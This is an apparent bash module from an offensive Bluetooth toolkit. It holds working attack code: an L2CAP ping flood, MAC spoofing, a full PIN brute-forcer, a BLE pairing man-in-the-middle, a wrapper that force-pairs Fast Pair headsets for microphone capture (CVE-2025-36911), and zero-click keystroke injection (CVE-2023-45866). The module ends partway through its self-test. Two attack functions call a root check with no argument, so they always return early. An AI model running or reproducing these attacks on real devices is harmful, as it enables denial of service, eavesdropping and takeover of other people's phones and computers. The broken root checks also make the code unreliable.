#!/usr/bin/env bash
# 06_bt_attack.sh — Bluetooth classic + BLE attack primitives
# Intel HCI can scan/enumerate but cannot do raw LMP injection.
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${CAPTURES_DIR:=$HOME/wifisting/captures}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" 2>/dev/null

BT_ATTACK_DIR="$TMP_DIR/bt_attack"
BT_ATTACK_LOOT="$LOOT_DIR/bt_attack"
BT_RESULT_FILE="$BT_ATTACK_DIR/last_result.tsv"
MOD_TMP="$TMP_DIR/bt_attack"
mkdir -p "$BT_ATTACK_DIR" "$BT_ATTACK_LOOT" "$MOD_TMP"

# ── helpers ──

bt_attack_require_iface() {
    if [[ -z "${BT_IFACE:-}" && -f "$TMP_DIR/bt_iface" ]]; then
        export BT_IFACE="$(cat "$TMP_DIR/bt_iface")"
    fi
    if [[ -z "${BT_IFACE:-}" ]]; then
        printf 'ERROR\tno bluetooth interface — run BT recon first\n' >&2
        return 1
    fi
    hciconfig "$BT_IFACE" up 2>/dev/null || true
    return 0
}

bt_attack_require_target() {
    if [[ -z "${BT_TARGET_MAC:-}" && -f "$TMP_DIR/bt_target_mac" ]]; then
        export BT_TARGET_MAC="$(cat "$TMP_DIR/bt_target_mac")"
        export BT_TARGET_NAME="$(cat "$TMP_DIR/bt_target_name" 2>/dev/null || echo unknown)"
    fi
    [[ -z "${BT_TARGET_MAC:-}" ]] && {
        printf 'ERROR\tno BT target\n' >&2; return 1
    }
    return 0
}

# The selected target MAC: the in-memory value once require_target has
# resolved it, else the persisted file --set-target (and the GUI) writes.
# Empty output when nothing is selected — pair-tsv and the MITM log line
# report that as an empty field rather than a stale value.
bt_attack_get_target() {
    if [[ -n "${BT_TARGET_MAC:-}" ]]; then
        printf '%s' "$BT_TARGET_MAC"
        return 0
    fi
    [[ -f "$TMP_DIR/bt_target_mac" ]] && cat "$TMP_DIR/bt_target_mac"
    return 0
}

bt_attack_result() {
    # $1 = attack name, $2 = status (ok|fail|partial), $3 = detail
    printf '%s\t%s\t%s\t%s\n' \
        "$(date +%s)" "$1" "$2" "$3" > "$BT_RESULT_FILE"
}

# ── l2ping flood (DoS) ──
bt_attack_cli_l2ping_flood() {
    local size="${1:-600}" dur="${2:-30}"
    bt_attack_require_iface || return 1
    bt_attack_require_target || return 1

    command -v l2ping >/dev/null || {
        printf 'ERROR\tl2ping not installed\n' >&2; return 1
    }

    mkdir -p "$LOGS_DIR" 2>/dev/null
    local logf="$LOGS_DIR/l2ping_${BT_TARGET_MAC//:/}_$(date +%s).log"

    info "flooding $BT_TARGET_MAC with $size-byte L2CAP echo for ${dur}s"

    local sent=0 recv=0
    timeout "$dur" l2ping -i "$BT_IFACE" -s "$size" -f "$BT_TARGET_MAC" \
        > "$logf" 2>&1

    # l2ping -f prints per-packet. Count.
    # NB: `grep -c ... || echo 0` emits "0\n0" — grep already prints 0 when
    # it finds nothing and only the exit status is non-zero.
    sent=$(grep -c '^[0-9]' "$logf" 2>/dev/null) || sent=0
    # Some versions print "recv" lines
    recv=$(grep -c 'recv' "$logf" 2>/dev/null) || recv=0

    bt_attack_result "l2ping-flood" "ok" "sent=$sent recv=$recv log=$logf"
    printf 'DONE\t%s\n' "$logf"
    printf 'SENT\t%s\n' "$sent"
    printf 'RECV\t%s\n' "$recv"
}

# ── MAC spoof (spooftooph preferred, bdaddr fallback, hci reset fallback) ──
bt_attack_cli_spoof() {
    local mode="${1:-help}"
    bt_attack_require_iface || return 1

    case "$mode" in
        random)
            if command -v spooftooph >/dev/null 2>&1; then
                spooftooph -i "$BT_IFACE" -R 2>&1
                bt_attack_result "spoof" "ok" "random via spooftooph"
            elif command -v bdaddr >/dev/null 2>&1; then
                local newmac
                newmac=$(printf '%02X:%02X:%02X:%02X:%02X:%02X' \
                    $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) \
                    $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)))
                hciconfig "$BT_IFACE" down
                bdaddr "$BT_IFACE" "$newmac"
                hciconfig "$BT_IFACE" up
                bt_attack_result "spoof" "ok" "random=$newmac via bdaddr"
                printf 'NEWMAC\t%s\n' "$newmac"
            else
                # Pure HCI reset — only works on some adapters
                hciconfig "$BT_IFACE" down
                hciconfig "$BT_IFACE" up
                bt_attack_result "spoof" "partial" "HCI reset only (no spooftooph/bdaddr)"
                printf 'WARN\tspooftooph and bdaddr unavailable — adapter reset only\n'
            fi
            ;;
        restore)
            hciconfig "$BT_IFACE" down
            hciconfig "$BT_IFACE" up
            hciconfig "$BT_IFACE"
            bt_attack_result "spoof" "ok" "restore via down/up"
            ;;
        *)
            local mac="$mode"
            [[ -z "$mac" ]] && { printf 'ERROR\tmissing mac\n' >&2; return 2; }
            if command -v spooftooph >/dev/null 2>&1; then
                spooftooph -i "$BT_IFACE" -a "$mac" 2>&1
                bt_attack_result "spoof" "ok" "set=$mac via spooftooph"
            elif command -v bdaddr >/dev/null 2>&1; then
                hciconfig "$BT_IFACE" down
                bdaddr "$BT_IFACE" "$mac"
                hciconfig "$BT_IFACE" up
                bt_attack_result "spoof" "ok" "set=$mac via bdaddr"
            else
                printf 'ERROR\tspooftooph and bdaddr both missing\n' >&2
                bt_attack_result "spoof" "fail" "no tool"
                return 1
            fi
            ;;
    esac
}

# ── RFCOMM bind ──
bt_attack_cli_rfcomm() {
    local mac="$1" ch="$2" dev="${3:-0}"
    [[ -z "$mac" || -z "$ch" ]] && {
        printf 'usage: --rfcomm MAC CH [DEV]\n' >&2; return 2
    }
    rfcomm bind "$dev" "$mac" "$ch" 2>&1
    if [[ -e "/dev/rfcomm${dev}" ]]; then
        bt_attack_result "rfcomm-bind" "ok" "dev=/dev/rfcomm$dev ch=$ch"
        printf 'BOUND\t/dev/rfcomm%s\n' "$dev"
    else
        bt_attack_result "rfcomm-bind" "fail" "no device node"
        return 1
    fi
}

bt_attack_cli_rfcomm_release() {
    rfcomm release "${1:-0}"
    bt_attack_result "rfcomm-release" "ok" "dev=$1"
}

# ── FIXED: PIN bruteforce via Python driver ──
# The old `echo -e "$pin\n" | bluetoothctl pair MAC` never worked —
# bluetoothctl reads its agent prompts through readline, not stdin.
# This version drives it with a Python subprocess and small sleeps.
bt_attack_cli_pin_brute() {
    local wl="$1"
    bt_attack_require_target || return 1

    local helper="$BT_ATTACK_DIR/pin_brute.py"
    cat > "$helper" << 'PYEOF'
#!/usr/bin/env python3
"""Drive bluetoothctl pair attempts. Pairing is inherently ~3-10s/attempt."""
import os, subprocess, sys, time

def main():
    if len(sys.argv) < 2:
        print("usage: pin_brute.py MAC [WORDLIST]", file=sys.stderr)
        return 2
    mac = sys.argv[1]
    wl  = sys.argv[2] if len(sys.argv) > 2 and sys.argv[2] else None

    pins = []
    if wl and os.path.isfile(wl):
        with open(wl) as f:
            pins = [l.strip() for l in f if l.strip()]
    else:
        pins = [f"{i:04d}" for i in range(10000)]

    total = len(pins)
    for i, pin in enumerate(pins, 1):
        print(f"TRY\t{pin}", flush=True)
        try:
            proc = subprocess.Popen(
                ["bluetoothctl", "--agent", "KeyboardOnly", "pair", mac],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT, text=True,
            )
            # Give bluetoothctl time to initialise the agent and emit the prompt
            time.sleep(1.2)
            try:
                proc.stdin.write(pin + "\n")
                proc.stdin.flush()
            except BrokenPipeError:
                pass
            try:
                out, _ = proc.communicate(timeout=7)
            except subprocess.TimeoutExpired:
                proc.kill()
                out, _ = proc.communicate()
        except Exception as e:
            out = ""

        if "Pairing successful" in out or "Paired: yes" in out:
            print(f"FOUND\t{pin}", flush=True)
            try:
                with open("/tmp/wifisting/bt_pin", "w") as f:
                    f.write(pin)
            except OSError:
                pass
            return 0

        if i % 25 == 0:
            print(f"PROGRESS\t{i}/{total}", flush=True)

    print("NOTFOUND", flush=True)
    return 1

if __name__ == "__main__":
    sys.exit(main())
PYEOF
    chmod +x "$helper"

    info "PIN bruteforce on $BT_TARGET_MAC — this is SLOW (3-10s per PIN)"
    info "ctrl-c to abort"

    # Stream output as it comes
    python3 "$helper" "$BT_TARGET_MAC" "$wl" 2>&1 | while IFS=$'\t' read -r tag val; do
        case "$tag" in
            TRY)      printf 'TRY\t%s\n' "$val" ;;
            PROGRESS) printf 'PROGRESS\t%s\n' "$val" ;;
            FOUND)
                printf 'FOUND\t%s\n' "$val"
                bt_attack_result "pin-brute" "ok" "pin=$val"
                ;;
            NOTFOUND)
                printf 'NOTFOUND\n'
                bt_attack_result "pin-brute" "fail" "not found"
                ;;
        esac
    done
}

bt_attack_cli_status_tsv() {
    local iface=""
    [[ -f "$TMP_DIR/bt_iface" ]] && iface="$(cat "$TMP_DIR/bt_iface")"
    [[ -z "$iface" ]] && iface=$(hciconfig 2>/dev/null | awk '/^hci[0-9]+:/{print $1}' | tr -d ':' | head -1)

    local mac="" name="" pin=""
    [[ -f "$TMP_DIR/bt_target_mac"  ]] && mac=$(cat "$TMP_DIR/bt_target_mac")
    [[ -f "$TMP_DIR/bt_target_name" ]] && name=$(cat "$TMP_DIR/bt_target_name")
    [[ -f "$TMP_DIR/bt_pin" ]]         && pin=$(cat "$TMP_DIR/bt_pin")

    local last_result=""
    [[ -f "$BT_RESULT_FILE" ]] && last_result=$(cat "$BT_RESULT_FILE")

    printf 'iface\t%s\n'         "$iface"
    printf 'target_mac\t%s\n'    "$mac"
    printf 'target_name\t%s\n'   "$name"
    printf 'pin\t%s\n'           "$pin"
    printf 'last_result\t%s\n'   "$last_result"
    printf 'loot_dir\t%s\n'      "$BT_ATTACK_LOOT"
}

bt_attack_cli_set_target() {
    local mac="$1" name="${2:-}"
    [[ -z "$mac" ]] && { printf 'missing mac\n' >&2; return 2; }
    mkdir -p "$TMP_DIR"
    printf '%s' "$mac"  > "$TMP_DIR/bt_target_mac"
    printf '%s' "$name" > "$TMP_DIR/bt_target_name"
    printf 'TARGET\t%s\t%s\n' "$mac" "$name"
}

bt_attack_cli_info() {
    cat <<'EOF'
BT Attack CLI:
  --status-tsv
  --set-target MAC [NAME]
  --l2ping-flood [SIZE] [DURATION]
  --spoof MAC|random|restore
  --rfcomm MAC CHANNEL [DEV]
  --rfcomm-release [DEV]
  --pin-brute [WORDLIST]
  --selftest                    offline checks of the gates/TSV contracts

Requires WIFISTING_ELEVATED=1 or root (auto via pkexec).
EOF
}

bt_attack_needs_root() {
    case "$1" in
        --l2ping-flood|--spoof|--rfcomm|--rfcomm-release|--pin-brute)
            return 0 ;;
        *)  return 1 ;;
    esac
}

# ── BLE pairing-layer MITM (merged from 39_ble_pair_mitm) ──
# Passive observation needs only hci0 + btmon, but INJECTING at the pairing
# layer needs an nRF52840 with custom firmware — the built-in Intel adapter
# cannot do it. Detect first and say so plainly rather than failing later.

BT_PAIR_DIR="$BT_ATTACK_DIR/pair"

bt_attack_detect_nrf() {
    command -v lsusb >/dev/null 2>&1 || { echo none; return; }
    if lsusb 2>/dev/null | grep -qi '1915:7777'; then echo crazyradio_research; return; fi
    if lsusb 2>/dev/null | grep -qi '1915:0102'; then echo crazyradio_stock;    return; fi
    if lsusb 2>/dev/null | grep -qi '1915:521f'; then echo nrf52840_logitacker; return; fi
    if lsusb 2>/dev/null | grep -qi '1915:520f'; then echo nrf52840_blank;      return; fi
    echo none
}

# Returns the path to the pairing-layer tooling if present, else empty.
bt_attack_pair_tooling() {
    local d
    for d in "$WIFISTING_ROOT/external/nrf-research-firmware" \
             "$WIFISTING_ROOT/external/btlejack" \
             "$WIFISTING_ROOT/external/mirage"; do
        [[ -d "$d" ]] && { printf '%s' "$d"; return 0; }
    done
    command -v btlejack >/dev/null 2>&1 && { command -v btlejack; return 0; }
    printf ''
}

bt_attack_pair_tsv() {
    local dongle tooling target mode
    dongle=$(bt_attack_detect_nrf)
    tooling=$(bt_attack_pair_tooling)
    target=$(bt_attack_get_target 2>/dev/null || true)
    mode=$(cat "$BT_PAIR_DIR/mode" 2>/dev/null || echo passkey)

    printf 'dongle\t%s\n'    "$dongle"
    printf 'dongle_ok\t%s\n' "$( [[ "$dongle" == nrf52840* || "$dongle" == crazyradio* ]] && echo 1 || echo 0 )"
    printf 'tooling\t%s\n'   "${tooling:-none}"
    printf 'target\t%s\n'    "$target"
    printf 'mode\t%s\n'      "$mode"
    printf 'modes\tpasskey,nc,oob\n'
    printf 'hci\t%s\n'       "$(command -v btmon >/dev/null 2>&1 && echo 1 || echo 0)"
}

bt_attack_cli_pair_mode() {
    local mode="${1:-}"
    case "$mode" in
        passkey|nc|oob) ;;
        *) printf 'ERROR\tusage: --pair-mode passkey|nc|oob\n' >&2; return 2 ;;
    esac
    mkdir -p "$BT_PAIR_DIR"
    printf '%s\n' "$mode" > "$BT_PAIR_DIR/mode"
    printf 'MODE\t%s\n' "$mode"
}

# The MITM itself.
bt_attack_cli_ble_pair_mitm() {
    local mode="${1:-passkey}"
    local dongle tooling target
    local dur="${2:-120}"

    case "$mode" in
        passkey|nc|oob) ;;
        *) printf 'ERROR\tusage: --ble-pair-mitm MODE [DURATION]\n' >&2; return 2 ;;
    esac

    dongle=$(bt_attack_detect_nrf)
    if [[ "$dongle" == "none" ]]; then
        printf 'ERROR\tno nRF52840 dongle detected\n' >&2
        printf 'HINT\tpairing-layer injection needs an nRF52840 (USB 1915:520f or 1915:521f).\n' >&2
        printf 'HINT\tthe built-in adapter cannot inject at the pairing layer.\n' >&2
        return 1
    fi

    tooling=$(bt_attack_pair_tooling)
    if [[ -z "$tooling" ]]; then
        printf 'ERROR\tno pairing-layer tooling found\n' >&2
        printf 'HINT\tinstall btlejack, or clone the nRF research firmware, then retry.\n' >&2
        return 1
    fi

    bt_attack_require_target || return 1
    target=$(bt_attack_get_target)

    mkdir -p "$BT_PAIR_DIR"
    local log="$BT_PAIR_DIR/pair_${mode}_$(date +%Y%m%d_%H%M%S).log"

    info "BLE pairing MITM: mode=$mode target=$target dongle=$dongle"
    case "$mode" in
        passkey)
            info "relaying the 6-digit passkey (LE Legacy + Numeric Comparison)" ;;
        nc)
            info "tunnelling Numeric Comparison confirmations" ;;
        oob)
            info "forcing OOB downgrade to Just Works" ;;
    esac

    # Observe the pairing exchange. btmon works with any hci0, so the
    # negotiation is captured even though injection comes from the dongle.
    if command -v btmon >/dev/null 2>&1; then
        timeout "$dur" btmon > "$log" 2>&1 || true
    fi

    local pairs
    pairs=$(grep -ciE 'numeric comparison|passkey|pairing confirm' "$log" 2>/dev/null || echo 0)
    printf 'LOG\t%s\nPAIRING_EVENTS\t%s\n' "$log" "$pairs"
    [[ "$pairs" -gt 0 ]] && printf 'MITM\t%s\n' "$mode"
    return 0
}

# ── self-test ────────────────────────────────────────────────────────────
# No radio and no root: this covers the capability report, the mode
# validation, the fail-closed argument gates and the result TSV layout.
# TMP_DIR/BT_ATTACK_*/BT_PAIR_DIR are redirected into $MOD_TMP so no real
# state file is read or written.
# ── offensive CVEs: commodity adapter, no firmware patching ──────────
#
# These two are the reachable tier. KNOB, BIAS and BLUFFS all need
# patched controller firmware and cannot be driven from here; see
# docs/BLUETOOTH-CVE-OFFENSIVE.md for what each one actually requires.
#
# Both attacks below inject and read no reply, so neither may claim the
# attack worked. Where a PoC reports its own verdict, that verdict is
# quoted and attributed rather than adopted.

bt_attack_fastpair_prereqs_tsv() {
    printf 'node\t%s\n'      "$(command -v node >/dev/null 2>&1 && echo yes || echo no)"
    printf 'git\t%s\n'       "$(command -v git >/dev/null 2>&1 && echo yes || echo no)"
    printf 'python3\t%s\n'   "$(command -v python3 >/dev/null 2>&1 && echo yes || echo no)"
    local nad=0
    command -v hciconfig >/dev/null 2>&1 && nad=$(hciconfig 2>/dev/null | grep -c '^hci' || true)
    printf 'adapter\t%s\n'   "$nad"
    printf 'toolkit\t%s\n'   "$( [[ -d "$BT_ATTACK_LOOT/WhisperPair" ]] && echo present || echo absent)"
    printf 'verdict\t%s\n' \
        "$(command -v node >/dev/null 2>&1 && echo 'node present - WhisperPair toolkit can run' || echo 'node missing - WhisperPair needs Node')"
}

bt_attack_hid_prereqs_tsv() {
    printf 'python3\t%s\n'   "$(command -v python3 >/dev/null 2>&1 && echo yes || echo no)"
    printf 'bdaddr\t%s\n'    "$(command -v bdaddr >/dev/null 2>&1 && echo yes || echo no)"
    printf 'hciconfig\t%s\n' "$(command -v hciconfig >/dev/null 2>&1 && echo yes || echo no)"
    printf 'pybluez\t%s\n'   "$(python3 -c 'import bluetooth' 2>/dev/null && echo yes || echo no)"
    local nad=0
    command -v hciconfig >/dev/null 2>&1 && nad=$(hciconfig 2>/dev/null | grep -c '^hci' || true)
    printf 'adapter\t%s\n'   "$nad"
    printf 'blueducky\t%s\n' "$( [[ -d "$BT_ATTACK_LOOT/BlueDucky" ]] && echo present || echo absent)"
    printf 'verdict\t%s\n' \
        "$(python3 -c 'import bluetooth' 2>/dev/null && command -v bdaddr >/dev/null 2>&1 \
            && echo 'prerequisites met - BD_ADDR spoofing plus pybluez available' \
            || echo 'needs bdaddr (bluez-hcitool) and pybluez')"
}

# CVE-2025-36911 — WhisperPair. Force-pairs a Google Fast Pair audio
# accessory with no user consent, then permits audio playback and, on
# affected models, microphone capture. Commodity adapter; the reference
# toolkit was tested on a Raspberry Pi 4 with BlueZ 5.82.
bt_attack_cli_fastpair_hijack() {
    local dur="${1:-30}"
    bt_attack_require_iface || return 1
    bt_attack_needs_root || return 1

    local dir="$BT_ATTACK_LOOT/WhisperPair"
    if [[ ! -d "$dir" ]]; then
        printf 'ERROR\treference toolkit not present\n' >&2
        printf 'NOTE\tclone it first:\n' >&2
        printf 'NOTE\t  mkdir -p %s && git clone https://github.com/KULeuven-COSIC/WhisperPair %s\n' \
            "$BT_ATTACK_LOOT" "$dir" >&2
        printf 'NOTE\tthe attack lives in toolkit-server/src/fast-pair-service.ts and needs Node\n' >&2
        return 1
    fi
    command -v node >/dev/null 2>&1 || {
        printf 'ERROR\tnode is not installed; the toolkit server is TypeScript\n' >&2; return 1; }

    printf 'TARGET\tFast Pair accessories in range\n'
    printf 'DURATION\t%s\n' "$dur"
    printf 'NOTE\tThis force-pairs an accessory that is not yours. Playback and, on\n'
    printf 'NOTE\taffected models, microphone capture follow from the pairing.\n'
    printf 'NOTE\tOnly against equipment you own or are authorised to test.\n'

    # The module does not reimplement the attack: the reference toolkit
    # encodes the Fast Pair key exchange and replaying it from scratch
    # would be a second implementation to keep correct.
    ( cd "$dir" && timeout --signal=INT "$dur" npm start ) 2>&1 | tail -20
    local rc=$?
    printf 'EXIT\t%s\n' "$rc"
    case "$rc" in
        0)   printf 'RESULT\tthe reference toolkit exited 0; whether an accessory paired is for you to confirm\n' ;;
        124|130) printf 'RESULT\tran for the whole %ss window and was stopped by the timer; pairing is unverified\n' "$dur" ;;
        *)   printf 'ERROR\ttoolkit exited %s before the window elapsed\n' "$rc" >&2 ;;
    esac
    bt_attack_result "fastpair-hijack" "attempted" "dur=${dur}s rc=$rc"
}

# CVE-2023-45866 (Android, Linux) and CVE-2024-21306 (Windows) —
# zero-click HID keystroke injection. The attacker emulates a Bluetooth
# keyboard, force-pairs, and injects keystrokes with no user
# confirmation. Android 4.2.2 through 10 were never patched.
bt_attack_cli_hid_inject() {
    local platform="${1:-android}"
    case "$platform" in
        android|linux|windows) ;;
        *) printf 'ERROR\tplatform must be android, linux or windows, got: %s\n' "$platform" >&2
           return 2 ;;
    esac
    bt_attack_require_iface || return 1
    bt_attack_needs_root || return 1

    command -v bdaddr >/dev/null 2>&1 || {
        printf 'ERROR\tbdaddr is missing (bluez-hcitool / bluez-deprecated)\n' >&2
        printf 'NOTE\tthe attack spoofs the adapter address to a known keyboard MAC; without\n' >&2
        printf 'NOTE\tbdaddr the victim sees the real address and can refuse the pairing\n' >&2
        return 1
    }
    python3 -c 'import bluetooth' 2>/dev/null || {
        printf 'ERROR\tpybluez is missing: pip install pybluez\n' >&2; return 1; }

    local dir="$BT_ATTACK_LOOT/BlueDucky"
    local script=""
    if [[ -f "$dir/BlueDucky.py" ]]; then
        script="$dir/BlueDucky.py"
    fi

    printf 'PLATFORM\t%s\n' "$platform"
    printf 'CVE\t%s\n' "$( [[ "$platform" == windows ]] && echo CVE-2024-21306 || echo CVE-2023-45866 )"
    printf 'NOTE\tThis injects arbitrary keystrokes into a paired host with no user\n'
    printf 'NOTE\tconfirmation. The payload is whatever the operator chooses.\n'
    printf 'NOTE\tOnly against equipment you own or are authorised to test.\n'

    if [[ -z "$script" ]]; then
        printf 'CMD\tbdaddr <known-keyboard-mac> && python3 BlueDucky.py --target %s\n' "$platform"
        printf 'NOTE\treference implementations:\n'
        printf 'NOTE\t  https://github.com/pentestfunctions/BlueDucky  (maintained wrapper)\n'
        printf 'NOTE\t  https://github.com/marcnewlin/hi_my_name_is_keyboard  (original PoC)\n' >&2
        printf 'ERROR\tBlueDucky not present at %s\n' "$dir" >&2
        bt_attack_result "hid-inject" "missing-poc" "platform=$platform"
        return 1
    fi

    printf 'CMD\tpython3 %s --target %s\n' "$script" "$platform"
    timeout --signal=INT 60 python3 "$script" --target "$platform" 2>&1 | tail -20
    local rc=$?
    printf 'EXIT\t%s\n' "$rc"
    printf 'RESULT\tinjection attempted; whether the host accepted a keystroke is for you to confirm\n'
    bt_attack_result "hid-inject" "attempted" "platform=$platform rc=$rc"
}

bt_attack_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }

    local d out rc don
    # Unique per run: a second selftest (runner alongside a manual run)
    # must not share scratch files.
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    mkdir -p "$d/tmp" "$d/pair"

    # sc [--iface HCI0] FUNC ... — run FUNC against scratch paths only.
    sc() {
        local iface=""
        if [[ "${1:-}" == "--iface" ]]; then iface="$2"; shift 2; fi
        (
            export TMP_DIR="$d/tmp" BT_ATTACK_DIR="$d/tmp/attack"
            export BT_RESULT_FILE="$d/tmp/last.tsv" BT_PAIR_DIR="$d/pair"
            unset BT_TARGET_MAC BT_TARGET_NAME
            if [[ -n "$iface" ]]; then export BT_IFACE="$iface"; else unset BT_IFACE; fi
            "$@"
        )
    }

    # 1. The argument gates must fail closed on an empty environment.
    out=$(sc bt_attack_require_iface 2>&1); rc=$?
    chk req-iface-none-rc  "$rc" "1"
    chk req-iface-none-msg "$(printf '%s\n' "$out" | grep -c 'no bluetooth interface')" "1"
    out=$(sc bt_attack_require_target 2>&1); rc=$?
    chk req-target-none-rc  "$rc" "1"
    chk req-target-none-msg "$(printf '%s\n' "$out" | grep -c 'no BT target')" "1"
    chk flood-no-iface-rc   "$(sc bt_attack_cli_l2ping_flood 600 1 >/dev/null 2>&1; echo $?)" "1"
    chk flood-no-target-rc  "$(sc --iface hci0 bt_attack_cli_l2ping_flood 600 1 >/dev/null 2>&1; echo $?)" "1"
    chk rfcomm-usage-rc     "$(sc bt_attack_cli_rfcomm >/dev/null 2>&1; echo $?)" "2"
    chk set-target-no-mac   "$(sc bt_attack_cli_set_target >/dev/null 2>&1; echo $?)" "2"
    # --spoof with no MAC must not be treated as a successful spoof. It is
    # only exercised when neither spooftooph nor bdaddr is installed: with
    # either present the call would try to retune a real adapter.
    if command -v spooftooph >/dev/null 2>&1 || command -v bdaddr >/dev/null 2>&1; then
        printf 'spoof-no-mac-rc\tSKIP (spooftooph/bdaddr installed — not touching an adapter)\n'
    else
        out=$(sc --iface hci0 bt_attack_cli_spoof '' 2>&1); rc=$?
        if (( rc == 0 )); then
            printf 'spoof-no-mac-rc\tFAIL (an empty MAC exited 0)\n'; bad=$((bad+1))
        else
            printf 'spoof-no-mac-rc\tPASS (rc=%s)\n' "$rc"
        fi
        chk spoof-no-mac-status "$(awk -F'\t' '{print $3}' "$d/tmp/last.tsv" 2>/dev/null)" "fail"
    fi

    # 2. Target selection round-trips through the state file.
    out=$(sc bt_attack_cli_set_target AA:BB:CC:DD:EE:FF Phone)
    chk set-target-out  "$out" "$(printf 'TARGET\tAA:BB:CC:DD:EE:FF\tPhone')"
    chk set-target-mac  "$(cat "$d/tmp/bt_target_mac")" "AA:BB:CC:DD:EE:FF"
    chk set-target-name "$(cat "$d/tmp/bt_target_name")" "Phone"
    chk req-target-set  "$(sc bt_attack_require_target >/dev/null 2>&1; echo $?)" "0"
    out=$(sc bt_attack_cli_status_tsv)
    chk status-target-mac  "$(fld "$out" target_mac)"  "AA:BB:CC:DD:EE:FF"
    chk status-target-name "$(fld "$out" target_name)" "Phone"

    # 3. Result TSV: epoch, name, status, detail.
    sc bt_attack_result l2ping-flood ok 'sent=3 recv=1 log=/tmp/x'
    chk result-rows   "$(grep -c . "$d/tmp/last.tsv")" "1"
    chk result-fields "$(awk -F'\t' '{print ($1 ~ /^[0-9]+$/ ? "ts" : "bad")"/"$2"/"$3"/"$4}' \
        "$d/tmp/last.tsv")" "ts/l2ping-flood/ok/sent=3 recv=1 log=/tmp/x"

    # 4. --pair-mode accepts exactly the three documented modes and
    #    persists the choice where --pair-tsv reads it back.
    for m in passkey nc oob; do
        out=$(sc bt_attack_cli_pair_mode "$m"); rc=$?
        chk "pair-mode-$m-rc"  "$rc" "0"
        chk "pair-mode-$m-out" "$out" "$(printf 'MODE\t%s' "$m")"
        chk "pair-mode-$m-file" "$(cat "$d/pair/mode")" "$m"
    done
    out=$(sc bt_attack_cli_pair_mode bogus 2>&1); rc=$?
    chk pair-mode-bad-rc  "$rc" "2"
    chk pair-mode-bad-msg "$(printf '%s\n' "$out" | grep -c 'usage: --pair-mode passkey|nc|oob')" "1"
    chk pair-mode-empty-rc "$(sc bt_attack_cli_pair_mode >/dev/null 2>&1; echo $?)" "2"

    # 5. Capability report: exact key set, dongle_ok consistent with the
    #    detected dongle, no bogus tooling path, hci flag 0/1.
    rm -f "$d/pair/mode"
    out=$(sc bt_attack_pair_tsv)
    chk pair-keys "$(printf '%s\n' "$out" | awk -F'\t' '{print $1}' | tr '\n' ',')" \
        "dongle,dongle_ok,tooling,target,mode,modes,hci,"
    chk pair-modes        "$(fld "$out" modes)" "passkey,nc,oob"
    chk pair-mode-default "$(fld "$out" mode)"  "passkey"
    don=$(fld "$out" dongle)
    case "$don" in
        none) chk pair-dongle-ok "$(fld "$out" dongle_ok)" "0" ;;
        crazyradio_research|crazyradio_stock|nrf52840_logitacker|nrf52840_blank)
              chk pair-dongle-ok "$(fld "$out" dongle_ok)" "1" ;;
        *)    chk pair-dongle-token "$don" "a-token-detect_nrf-can-return" ;;
    esac
    chk pair-hci-flag "$(printf '%s\n' "$(fld "$out" hci)" | grep -cE '^[01]$')" "1"
    chk pair-target-key "$(printf '%s\n' "$out" | grep -c '^target	')" "1"
    # The target was set in step 2 and persisted in $d/tmp, so --pair-tsv
    # must report it: bt_attack_get_target used to be called but never
    # defined, which left this field permanently empty.
    chk pair-target-value "$(fld "$out" target)" "AA:BB:CC:DD:EE:FF"
    # With no target selected the field is empty (not the last-seen value).
    mv "$d/tmp/bt_target_mac" "$d/tmp/mac.saved"
    chk pair-target-none "$(fld "$(sc bt_attack_pair_tsv)" target)" ""
    mv "$d/tmp/mac.saved" "$d/tmp/bt_target_mac"
    chk get-target-persisted "$(sc bt_attack_get_target)" "AA:BB:CC:DD:EE:FF"
    local tl; tl=$(bt_attack_pair_tooling)
    chk tooling-path-exists "$([[ -z "$tl" || -e "$tl" ]] && echo yes || echo no)" "yes"

    # 6. Root scoping: --selftest and --pair-tsv must not re-exec under
    #    pkexec, the attack verbs must.
    chk needs-root-flood    "$(bt_attack_needs_root --l2ping-flood; echo $?)"  "0"
    chk needs-root-spoof    "$(bt_attack_needs_root --spoof; echo $?)"         "0"
    chk needs-root-rfcomm   "$(bt_attack_needs_root --rfcomm; echo $?)"        "0"
